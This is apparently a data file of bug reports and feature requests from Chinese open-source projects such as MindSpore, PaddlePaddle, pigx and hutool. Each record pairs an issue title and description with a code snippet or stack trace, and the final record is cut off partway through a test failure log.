【众智】【计算-AICPU开发】SparseSoftmaxCrossEntropyWithLogits,"SparseSoftmaxCrossEntropyWithLogits 验收规格： 支持类型为float16、floa32 （1）float16 满足精度误差为：loss=5e-3 （任务跟踪 https://gitee.com/ascend/modelzoo/issues/I5MQV0） （2）float32 满足标准误差 1.1 功能介绍 非稀疏算子，计算 softmax 交叉熵损失和梯度 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/sparse_ops.py class SparseSoftmaxCrossEntropyWithLogits(Primitive): 1.3 异常处理 1.4 算子反向   <code>: REG_OP(SparseSoftmaxCrossEntropyWithLogits) .INPUT(features, TensorType({DT_FLOAT16,DT_FLOAT})) .INPUT(labels, TensorType({DT_INT32, DT_INT64})) .OUTPUT(loss, TensorType({DT_FLOAT16,DT_FLOAT})) .OUTPUT(backprop, TensorType({DT_FLOAT16,DT_FLOAT})) .OP_END_FACTORY_REG(SparseSoftmaxCrossEntropyWithLogits)"
"增强 pigx-common-feign,增加 feign endpoint","环境信息 pigx版本: 3.8 是否修改包名: 否 访问 服务:port/actuator/feign 可以输出当前服务的所有有效的 feginclient 及method url 等关键信息， 支持 spring boot admin 展示   <code>: @Endpoint(id = ""feign"") +public class FeignClientEndpoint implements SmartInitializingSingleton {}"
InvoiceApi.InsertCardToBag出现72031异常，order_id is empty,"提交个bug，调用方法Senparc.Weixin.MP.AdvancedAPIs.InvoiceApi.InsertCardToBag出现异常，order_id都正确，如下log： 改成自己的post方法则没有问题，所有参数都正确。望核实解决。   <code>: 微信 POST 请求发生错误！错误代码：72031，说明：invalid params, order_id is empty hint: [uedqhA00131565] ===&gt;&gt; 在 Senparc.Weixin.CommonAPIs.CommonJsonSend.&lt;&gt;c.&lt;.cctor&gt;b__6_1(String apiUrl, String returnText) 在 Senparc.CO2NET.HttpUtility.Post.PostGetJson[T](IServiceProvider serviceProvider, String url, CookieContainer cookieContainer, Stream fileStream, Encoding encoding, X509Certificate2 cer, Boolean useAjax, Boolean checkValidationResult, Action`2 afterReturnText, Int32 timeOut) 在 Senparc.Weixin.CommonAPIs.CommonJsonSend.Send[T](String accessToken, String urlFormat, Object data, CommonJsonSendType sendType, Int32 timeOut, Boolean checkValidationResult, JsonSetting jsonSetting) 在 Senparc.Weixin.MP.AdvancedAPIs.InvoiceApi.&lt;&gt;c__DisplayClass24_0.&lt;InsertCardToBag&gt;b__0(String accessToken) 在 Senparc.Weixin.CommonAPIs.ApiHandlerWapper.ApiHandlerWapperBase.TryCommonApiBase[T](PlatformType platformType, Func`1 accessTokenContainer_GetFirstOrDefaultAppIdFunc, Func`2 accessTokenContainer_CheckRegisteredFunc, Func`3 accessTokenContainer_GetAccessTokenResultFunc, Int32 invalidCredentialValue, Func`2 fun, String accessTokenOrAppId, Boolean retryIfFaild) 在 Senparc.Weixin.MP.ApiHandlerWapper.TryCommonApi[T](Func`2 fun, String accessTokenOrAppId, Boolean retryIfFaild)"
selectCountByExample  使用Criteria处理带条件的where查询  在解析成sql的时候，不能自动转成 下划线 形式的字段,"前提： 数据库中不同表之间有使用驼峰规则命名表的属性字段 也有使用下划线形式命名属性字段 这个前提导致不能整体配置某一规则 问题： 表中的字段定义： varchar(100) 设置where条件： criteria.andEqualTo(""companyUuid"",companyUuid); 解析的sql: SELECT COUNT(*) FROM company WHERE companyUuid = ? 可不可以定义一个注解，直接作用在表对应的实体上，在解析sql的时候自动转换 company_uuid   <code>: company_uuid"
"OSError: (External) CUDNN error(8), CUDNN_STATUS_EXECUTION_FAILED在启动文本识别训练时出现的错误，同为一个数据集，文本检测可以跑！这是什么问题还请各位伙伴们帮忙看看","OSError: (External) CUDNN error(8), CUDNN_STATUS_EXECUTION_FAILED. [Hint: 'CUDNN_STATUS_EXECUTION_FAILED'. The GPU program failed to execute. This is usually caused by a failure to launch some cuDNN kernel on the GPU, which can occur for multiple reasons. To correct, check that the hardware, an appropriate version of the driver, and the cuDNN library are correctly installed. Otherwise, this may indicate an internal error/bug in the library. ] (at ..\paddle/fluid/operators/rnn_op.cu.cc:873)   <code>: core.dygraph_run_backward([self], [grad_tensor], retain_graph,"
导入解析excel报错,"JDK版本： jdk 1.8.0_151 hutool版本： 5.4.15.8.5(最新亦有问题) 导入解析excel报错 Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.Cell.getCellType()Lorg/apache/poi/ss/usermodel/CellType; at cn.hutool.poi.excel.cell.CellUtil.getCellValue(CellUtil.java:98) at cn.hutool.poi.excel.cell.CellUtil.getCellValue(CellUtil.java:66) at cn.hutool.poi.excel.RowUtil.readRow(RowUtil.java:76) at cn.hutool.poi.excel.RowUtil.readRow(RowUtil.java:50) at cn.hutool.poi.excel.reader.AbstractSheetReader.readRow(AbstractSheetReader.java:138) at cn.hutool.poi.excel.reader.MapSheetReader.read(MapSheetReader.java:53) at cn.hutool.poi.excel.reader.MapSheetReader.read(MapSheetReader.java:19) at cn.hutool.poi.excel.ExcelReader.read(ExcelReader.java:375) at cn.hutool.poi.excel.ExcelReader.read(ExcelReader.java:319) at cn.hutool.poi.excel.ExcelReader.readAll(ExcelReader.java:302) 不同方法导入都是一个错误 截图   <code>: // controller file ::: MultipartFile ExcelReader reader = ExcelUtil.getReader(file.getInputStream()); List&lt;Map&lt;String, Object&gt;&gt; mapList = reader.readAll();"
[CT][MS][CI] TypeError: bprop() takes 5 positional arguments but 7 were given,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_bprop_inlinebprop_mutil_crosscell_1 test_bprop_inlinebprop_mutil_crosscell_2 test_bprop_inlinebprop_mutil_crosscell_3 test_ctrl_if_while_bprop_true pass   <code>: def test_bprop_inlinebprop_mutil_crosscell_2(): net = InlineBpropMutilCrossCell2() input1 = Tensor(np.ones([2, 2]).astype(np.float32)) input2 = Tensor(np.ones([2, 2]).astype(np.float32)) &gt; grads = get_bprop_grads(net, input1, input2) ../interface/backward/test_bprop.py:928: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../interface/backward/test_bprop.py:38: in get_bprop_grads grads = grad_net(input1, input2) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:403: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:344: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:75: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:377: in after_grad out = _pynative_exec(fn, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PynativeExecutor object at 0x7f96fa619650&gt; obj = InlineBpropMutilCrossCell2&lt; (f1): TwoInputBprop&lt;&gt; (f3): TwoInputBprop&lt;&gt; (f5): TwoInputBprop&lt;&gt; (f2): TwoInput&lt;&gt; (f4): TwoInput&lt;&gt; (f6): TwoInput&lt;&gt; &gt; args = (Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]]), Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]])) kwargs = {} def __call__(self, obj, *args, **kwargs): args = args + tuple(kwargs.values()) &gt; return self._executor(obj, args) E TypeError: bprop() takes 5 positional arguments but 7 were given /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:425: TypeError ----------------------------- Captured stdout call -----------------------------"
显存超限调试办法,"如果减小batch size不能解决问题，请确认下需要初始化的variable的shape, 排除网络配置错误。   <code>: for var in startup_prog.list_vars(): print('var name: {}; shape: {}'.format(var.name, var.shape))"
Fleet分布式保存0号机和1号机保存参数权值diff很大,利用fleet transpiler模式分布式训练的时候，利用方法保存模型参数， 0号机保存的权值和1号机保存的权值diff很大 有以下两个问题： 如何保存参数，以哪台机子为准 如何利用保存参数做分布式预测   <code>: fluid.save_persistable
"[CT][MS][doc] When run for API AllReduce、AllGather、Broadcast、ReduceOp、ReduceScatter, example is failed.",": Ascend /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.AllReduce.html?highlight=allreduce#mindspore.ops.AllReduce 这AllReduce、AllGather、Broadcast、ReduceOp、ReduceScatter，五个 直接拷贝测试样例后，在Ascend环境，用python，直接执行，出现RANK_ID错误 1，在官网ops算子，说明文档中加入Ascend分布式的简单说明，或者Ascend分布式的链接 2，类似https://e.gitee.com/mind_spore/issues/list?tab=files&amp;issue=I4KKV2   <code>: (vm3.7) [root@localhost doc]# python aaa.py Traceback (most recent call last): File ""aaa.py"", line 9, in &lt;module&gt; init() File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/communication/management.py"", line 135, in init _check_parallel_envs() File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/communication/management.py"", line 71, in _check_parallel_envs raise RuntimeError(""Environment variables RANK_ID has not been exported, please export variables 'RANK_ID'."") RuntimeError: Environment variables RANK_ID has not been exported, please export variables 'RANK_ID'."
"blas_impl.h:747: Expected dim_a.width_ == dim_b.height_, but received dim_a.width_:1 != dim_b.height_:784","报错提示：[Hint: Expected dim_a.width_ == dim_b.height_, but received dim_a.width_:1 != dim_b.height_:784.] at (/paddle/paddle/fluid/operators/math/blas_impl.h:747) 错误发生在：课节5：第二章一个案例吃透深度学习(上)：[项目]2.通过极简方案快速构建手写数字识别模型 将所有的教程代码，写到一个model.py文件，并在ai studio运行python model.py,最后预测: 预测输出取整，即为预测的数字，打印结果 notebook教程里正常运行 项目地址：https://aistudio.baidu.com/bjcpu/user/52668/719950/notebooks/719950.ipynb   <code>: print(""本次预测的数字是"", result.numpy().astype('int32'))的时候出现这个错误"
GPU版本和CPU版本的LayerNorm反向传播梯度不一致,"您好，我在测试paddle的LayerNorm发现了一个问题 环境：2080Ti，cuda11.2 安装paddlepaddle-gpu（cuda11.2版本） 使用下面的测试代码 我这里得到的结果是 若安装CPU版本，得到结果是 经过验证，cpu版本下运算得到的梯度是正确的，感觉是计算存在某些bug   <code>: import paddle import numpy as np x = np.array([[[[-1.83965693, -1.82964566]]]]).astype(np.float32) x_tensor = paddle.to_tensor(x).cpu() # x_tensor = paddle.to_tensor(x).cuda() x_tensor.stop_gradient = False layernorm = paddle.nn.LayerNorm(normalized_shape=(1, 1, 2), epsilon=1e-5) out = layernorm(x_tensor) print(""Out is: "", out) out = out.sum() out.backward() print(""X grad is: "", x_tensor.grad) Out is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CUDAPlace(0), stop_gradient=False, [[[[-0.84284753, 0.84282744]]]]) X grad is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CUDAPlace(0), stop_gradient=False, [[[[-21.41206169, 21.41332817]]]]) Out is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CPUPlace, stop_gradient=False, [[[[-0.84543723, 0.84541708]]]]) X grad is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CPUPlace, stop_gradient=False, [[[[-0.00143835, 0.00143831]]]])"
sql解析,"当前使用版本 3.1.0 该问题是怎么引起的？**** SELECT id FROM WHERE !( (trigger_code in (0, 200) and handle_code = 0) OR (handle_code = 200) ) AND = 0 ORDER BY id ASC; SELECT t.* FROM TBL_JOB_TRIGGER_GROUP AS t WHERE t.address_type = #{addressType} ORDER BY t.order ASC; SELECT t.* FROM TBL_JOB_TRIGGER_REGISTRY AS t WHERE t.update_time ]]&gt; DATE_ADD(NOW(),INTERVAL -#{timeout} SECOND); 执行以上三条sql语句会浮现 Caused by: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Failed to process, please exclude the tableName or statementId.   <code>: TBL_JOB_TRIGGER_LOG alarm_status"
[CT][MS][OCCM][BatchMatMul][api mapping] The example in api mapping document of torch_diff BatchMatMul has error.,"The example in api mapping document of BatchMatMul has error The example in api mapping document of BatchMatMul has error / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph BatchMatMul api映射样例： 使用doctest测试样例 结果有误,空格差异   <code>: # PyTorch import numpy as np import torch from torch import tensor input = torch.tensor(np.ones(shape=[2, 1, 4]), dtype=torch.float32) mat2 = torch.tensor(np.ones(shape=[2, 4, 2]), dtype=torch.float32) output = torch.bmm(input, mat2).numpy() print(output) # [[[4. 4.]] # [[4. 4.]]] # MindSpore import numpy as np import mindspore import mindspore.ops as ops from mindspore import Tensor x = Tensor(np.ones(shape=[2, 1, 4]), mindspore.float32) y = Tensor(np.ones(shape=[2, 4, 2]), mindspore.float32) batmatmul = ops.BatchMatMul() output = batmatmul(x, y) print(output) # [[[4. 4.]] # [[4. 4.]]] Trying: batmatmul = ops.BatchMatMul() Expecting nothing ok Trying: output = batmatmul(x, y) Expecting nothing ok Trying: print(output) Expecting: [[[4. 4.]] [[4. 4.]]] ********************************************************************** File ""/home/jenkins-slave/workspace/ME_Excutor_DOC_Daily_EulerOS_OpenSource_CPU/test_log/example_testing_temp.py"", line 23, in example_testing_temp Failed example: print(output) Expected: [[[4. 4.]] [[4. 4.]]] Got: [[[4. 4.]] &lt;BLANKLINE&gt; [[4. 4.]]] ********************************************************************** 1 items had failures: 2 of 16 in example_testing_temp 16 tests in 1 items. 14 passed and 2 failed. ***Test Failed*** 2 failures. ==================== 1 failed in 1minutes ====================== ### end api_mapping.pytorch_diff.BatchMatMul ###"
1000x slower than tensorflow when reducing large array,"Here is the paddle code: Here is the equivalent tensorflow code test on TITAN X, 3s per loop in paddle and 3ms per loop in tensorflow. After some digging, paddle reduce mean by using eigen, and tf reduce mean by using cub, I think it is the reason that causes this issue.   <code>: import os os.environ['CUDA_VISIBLE_DEVICES'] = '1' import paddle import paddle.fluid as fluid sp = fluid.Program() tp = fluid.Program() image_shape = [50* 1000 * 2000] def foo(input): mean = fluid.layers.reduce_mean(input, dim=0, keep_dim=True) return input-mean with fluid.program_guard(tp, sp): x = fluid.layers.data(name='img', shape=image_shape, dtype='float32', append_batch_size=False) for i in range(10): x = foo(x) ttp = tp.clone(True) fluid.release_memory(ttp, skip_opt_set=[x.name]) exe = fluid.Executor(fluid.CUDAPlace(0)) exe.run(sp) imgs = np.zeros(image_shape).astype('float32') result = exe.run(tp, feed={'img':imgs*1}, fetch_list=[x]) import os os.environ['CUDA_VISIBLE_DEVICES'] = '0' import tensorflow as tf import numpy as np image_shape = [50* 1000 * 2000] x = tf.placeholder(""float"", image_shape) y = x for i in range(1000): mean = tf.reduce_mean(y, axis=0) y = y - mean init = tf.global_variables_initializer() with tf.Session() as sess: sess.run(init) data = np.zeros(image_shape) for i in range(5): sess.run(y, feed_dict={x:data})"
跑ci-server的ci流程时，耗时30分钟，任务正常结束，但是界面上仍为执行中，服务日志报错，Read timed out,服务日志：   <code>: 2021-06-26 19:34:06.666 ERROR 1 --- [ream-1868281130] c.g.d.api.async.ResultCallbackTemplate : Error during callback java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.fillBuffer(SessionInputBufferImpl.java:149) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.readLine(SessionInputBufferImpl.java:280) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.getChunkSize(ChunkedInputStream.java:261) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.nextChunk(ChunkedInputStream.java:222) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.read(ChunkedInputStream.java:147) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.io.EofSensorInputStream.read(EofSensorInputStream.java:118) ~[httpcore5-5.1.1.jar:5.1.1] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:30) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:12) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:275) ~[docker-java-core-3.2.8.jar:na] at java.base/java.lang.Thread.run(Thread.java:829) ~[na:na] 2021-06-26 19:34:06.667 ERROR 1 --- [ asyncTask-10] dev.jianmu.infrastructure.AppConfig : Async方法执行异常 java.lang.RuntimeException: java.net.SocketTimeoutException: Read timed out at com.github.dockerjava.api.async.ResultCallbackTemplate.throwFirstError(ResultCallbackTemplate.java:158) ~[docker-java-api-3.2.8.jar:na] at com.github.dockerjava.api.async.ResultCallbackTemplate.awaitCompletion(ResultCallbackTemplate.java:93) ~[docker-java-api-3.2.8.jar:na] at dev.jianmu.infrastructure.docker.EmbeddedDockerWorker.runTask(EmbeddedDockerWorker.java:196) ~[infrastructure-1.0-SNAPSHOT.jar:na] at dev.jianmu.infrastructure.docker.EmbeddedDockerWorker$$FastClassBySpringCGLIB$$1570030c.invoke(&lt;generated&gt;) ~[infrastructure-1.0-SNAPSHOT.jar:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.3.8.jar:5.3.8] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) ~[spring-aop-5.3.8.jar:5.3.8] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.3.8.jar:5.3.8] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) ~[spring-aop-5.3.8.jar:5.3.8] at org.springframework.aop.interceptor.AsyncExecutionInterceptor.lambda$invoke$0(AsyncExecutionInterceptor.java:115) ~[spring-aop-5.3.8.jar:5.3.8] at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:829) ~[na:na] Caused by: java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.fillBuffer(SessionInputBufferImpl.java:149) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.readLine(SessionInputBufferImpl.java:280) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.getChunkSize(ChunkedInputStream.java:261) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.nextChunk(ChunkedInputStream.java:222) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.read(ChunkedInputStream.java:147) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.io.EofSensorInputStream.read(EofSensorInputStream.java:118) ~[httpcore5-5.1.1.jar:5.1.1] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:30) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:12) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:275) ~[docker-java-core-3.2.8.jar:na] ... 1 common frames omitted
"saas多租户模式-独立database模式下无法获取Tenant, 导致无法自动切换的问题","Furion 1.15.9 webapi项目 postgresql 问题描述: 按照文档中的多租户的独立database模式编写代码, 发现没有切换到指定的数据库.经调试,发现 在 FurionDbContext 类中,以下返回 之后返回默认的连接字符串. public string GetDatabaseConnectionString() { return base.Tenant?.ConnectionString??""默认链接字符串""; } 证明base.Tenant 返回的是空. 翻看最新的源代码和1.15版本的代码,发现已经做了改进. 以下是1.15版本的代码AppDbContext 的 Tenant属性代码. get { // 如果没有实现多租户方式，则无需查询 if (Db.CustomizeMultiTenants || !typeof(IPrivateMultiTenant).IsAssignableFrom(GetType())) return default; 将以上代码部分拷贝到 自己的项目代码中, 进行调试. 发现 在调试过程中 调试器 断点到 &gt;&gt;&gt;&gt; 指向代码时, 并不往下执行, 而是直接跳出.执行后续的代码 改写 在&gt;&gt;&gt;&gt; 指向的代码上 增加 var cnt = tenantDbContext.Set().count() 代码. 发现 新增加的语句也一样. 执行到这段代码后, 不继续执行, 直接跳出. 此问题不知是调试器问题,还是我配置的问题. 分析到此处, 没有找到具体原因. 具体问题是. 使用的base.Tenant 为什么是null. 这种情况是否正常.如果不正常, 是什么原因造成的. 文档中的多租户独立database模式. 的样例代码, 具体没有完成切换是什么原因. 以下是我的代码, 和文档中完全一致的, 我就不贴了, 我把 写的entity类和 service 贴出来. public class B_User : IEntity { [Key] public long buid { get; set; } public class LoginService : ILoginService, ITransient { private readonly IRepository&lt;B_User, MultiTenantDbContextLocator&gt; _userRepository;   <code>: // 判断 HttpContext 是否存在 var httpContext = App.HttpContext; if (httpContext == null) return default; // 获取主机地址 var host = httpContext.Request.Host.Value; // 从内存缓存中读取或查询数据库 var memoryCache = App.GetService&lt;IMemoryCache&gt;(); return memoryCache.GetOrCreate($""{host}:MultiTenants"", cache =&gt; { // 读取数据库 var tenantDbContext = Db.GetNewDbContext&lt;MultiTenantDbContextLocator&gt;(); if (tenantDbContext == null) return default; &gt;&gt;&gt;&gt; return tenantDbContext.Set&lt;Tenant&gt;().FirstOrDefault(u =&gt; u.Host == host); }); } public String usercode { get; set; } public String username { get; set; } public String userphone { get; set; } public String password { get; set; } } public LoginService(IRepository&lt;B_User, MultiTenantDbContextLocator&gt; userRepository) { _userRepository = userRepository; } public async Task&lt;string&gt; loginAsync(string usercode, string passwd, string checkcode) { B_User _user = _userRepository.Where(p =&gt; p.usercode == usercode).FirstOrDefault(); if(_user != null) { ""查询到结果信息"".LogInformation(""""); } else { _user = new B_User(); _user.buid = SnowIDHelper.genSnowID(); _user.usercode = usercode; await _userRepository.InsertAsync(_user); } ""测试日志"".LogError(""""); return ""ok""; } }"
CT][MS][CI] log is not the same on gpu and ascend,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_export_combined_net_input_type_check ValueError: mindspore/core/utils/check_convert_utils.cc:384 CheckInteger] For Conv2D the x shape size must equal 4 , but got 0 TypeError: mindspore/core/utils/check_convert_utils.cc:529 _CheckTypeSame] For Conv2DFor Conv2D's type is not same [ name :w, type : Ref[Tensor(F32)]] [ name :x, type : Tuple[Tensor[Float32]*2]]   <code>: fact = NetFactory(epoch_size=1, batch_size=32, num_classes=12) net = CombinedConv2dMeanDenseAddMul(conv_bn=True, conv_act=""relu"", dense_bn=False, fc_act=""relu"") input_1 = Tensor(np.random.uniform(0.0, 1.0, size=[1, 3, 224, 112]).astype(np.float32)) input_2 = Tensor(np.random.uniform(0.0, 1.0, size=[7, 3, 224, 112]).astype(np.float32)) with pytest.raises(TypeError): export(net, input_1, input_2, file_name=fact.data_path + ""combined_net_2input_export"", quant_mode='AUTO') with pytest.raises(ValueError): export(net, None, file_name=fact.data_path + ""combined_net_none_export"", quant_mode='AUTO') with pytest.raises(TypeError): export(net, (input_1, input_2), file_name=fact.data_path + ""combined_net_tuple_export"", &gt; quant_mode='AUTO') ../offline_infer/test_export_quant_net.py:527:"
2.0.3的pom文件druid依赖有问题，ojdbc需要本地引入,druid 会依赖 tools 和 jconsole 2个jar，这两个包都是在jdk中，但是pom依赖有问题，他会到 com.alibaba 去找这两个包，最好加上不包含，排除这两个。 另外 我看新的2.0.3里面用到了oracle的jar，但是oracle限制maven仓库不能集成他的ojdbc文件，你们用的是私有库？ 不应该使用下面这种方式么？   <code>: &lt;!--druid --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${alibaba.druid.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;jconsole&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;tools&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc14&lt;/artifactId&gt; &lt;version&gt;${ojdbc14.version}&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/src/test/resources/oracle/ojdbc14.jar&lt;/systemPath&gt; &lt;/dependency&gt;
"Set num_parallel_workers to min(cores, num_parallel_workers) in dataset",Customer's Demands on Product/Solution 我们在modelzoo中dataset的num_parallel_workers都比较大，当在一些核数比较小的机器上就会报上面这个问题，能不能在dataset检验num_parallel_workers判断如果非法的话强制设置成环境能够使用的最大值 x，并打印WARNING级别的日志告诉用户这个值在该环境上最大只能设置x，并且现在运行时使用了x Requirement Value Description   <code>: ValueError: num_parallel_workers exceeds the boundary between 1 and 8
自定义微服务，图片上传，action直接调用为upms-biz模块上传接口，成功后图片显示不出来,"环境信息 pigx版本: 3.9 是否修改包名: 是 自定义微服务，子表单中上传图片，action直接设置为upms-biz模块中的upload接口 上传成功，OSS上传配置到了阿里云，upload接口返回 上传组件上显示不出图片，在开发工具中看没有img元素，如下图 1.请问图片为什么显示不出来？用 访问直接下载文件了 2.这么用可以吗，这块是在另一个微服务里，要得通过feign调用上传upms的文件服务吗   <code>: { label: '图片信息', prop: 'img', icon: 'el-icon-picture-outline', column: [ { label: '附件上传', prop: 'imgUrl', type: 'upload', listType: 'picture-img', loadText: '附件上传中，请稍等', span: 24, propsHttp: { res: 'data' }, tip: '只能上传jpg/png文件，且不超过500kb', action: '/admin/sys-file/upload' }, ] } {""code"":0,""msg"":null,""data"":{""bucketName"":""xxx"",""fileName"":""61d8799edf4643278cd7d3700c869128.jpg"",""url"":""/admin/sys-file/xxx/61d8799edf4643278cd7/admin/sys-file/xxxd3700c869128.jpg""}} localhost:8080/admin/sys-file/xxx/61d8799edf4643278cd7/admin/sys-file/xxxd3700c869128.jpg"
[CT][MS][Qr]偶现输出每个值与预期值符号相反,"mode graph test_qr.py::test_qr_input_1024x32x32_fp32   <code>: def test_qr_input_1024x32x32_fp32(): input_x = Tensor(np.random.randn(1024, 32, 32).astype(np.float32)) fact = QrMock(attributes={'full_matrices': False}, inputs=[input_x]) fact.forward_cmp() ../share/utils.py:31: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[-2.19375610e-01, 7.60588720e-02, -5.23664020e-02, ..., -7.50787258e-02, -2.70286560e-01, -7.8874506...21462986e-01, -8.57792050e-02, ..., 2.43836865e-02, -1.01304442e-01, -1.21507525e-01]]], dtype=float32) data_me = array([[[-2.19375610e-01, 7.60588795e-02, -5.23664020e-02, ..., -7.50787109e-02, -2.70286590e-01, -7.8874193...21462993e-01, -8.57792050e-02, ..., 2.43835673e-02, -1.01304539e-01, -1.21507511e-01]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 0.16360573 -0.17494439 -0.01490629 -0.05205132 -0.23724079 0.1276564 E -0.04242267 -0.16206217 -0.01081585 -0.0902284 0.17678781 0.00593367 E -0.20806456 -0.14765765 -0.17955747 0.12331439 0.16159871 -0.20960377 E -0.18726638 -0.08946201 0.05565928 -0.23001833 0.012372 0.10276234 E 0.12565877 -0.19972333 0.19491436 0.12891027 0.22884072 -0.20379563 E 0.10093395 0.09717377 -0.09217925 -0.04005701 